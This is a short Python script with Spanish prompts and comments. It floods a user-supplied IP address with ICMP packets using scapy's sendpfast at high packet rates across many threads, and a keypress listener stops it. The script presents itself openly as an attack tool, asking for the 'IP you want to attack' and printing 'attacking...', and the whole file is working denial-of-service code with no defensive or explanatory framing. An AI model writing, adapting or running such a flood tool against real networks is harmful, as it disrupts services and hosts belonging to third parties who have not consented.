#!/usr/bin/python3
import threading 
from scapy.all import *
from scapy.layers.inet import IP, ICMP, Ether
from pynput import keyboard
import subprocess

destino = input("ip a la que quieres atacar: ")
num_hilos= int(input("cuantos hilos quieres usar: "))

#destino = "10.0.2.15"
# num_hilos = 200
bucle = True
paquete = Ether()/IP(dst=destino)/ICMP()
def traza_icmp(ip):
    while bucle:
        sendpfast(paquete, pps=30000, loop=2000)
   
#-----------Crear hilos--------------------
hilos = []
def crear_hilos(num):
    print("[*] atacando... pulsa f para finalizar")
    for i in range(1, num):
        hilo = threading.Thread(target=traza_icmp, args=(destino,))
        hilo.start()
        hilos.append(hilo)

#------------funcion para detener bucle al presionar tecla 'f'----------
def on_press(key):
    global bucle
    try:
        if key.char == 'f':
            print("[*] Tecla 'f' presionada. Saliendo del bucle...")
            bucle = False
            return False  # Detener el listener
    except AttributeError:
        pass

#----------Crear listener para leer las pulsaciones del teclado------
listener = keyboard.Listener(on_press=on_press)
listener.start()

#-------Iniciar función que crea los hilos-----
crear_hilos(num_hilos)
#--------bucle para finalizar los hilos------
for hilo in hilos:
    hilo.join()


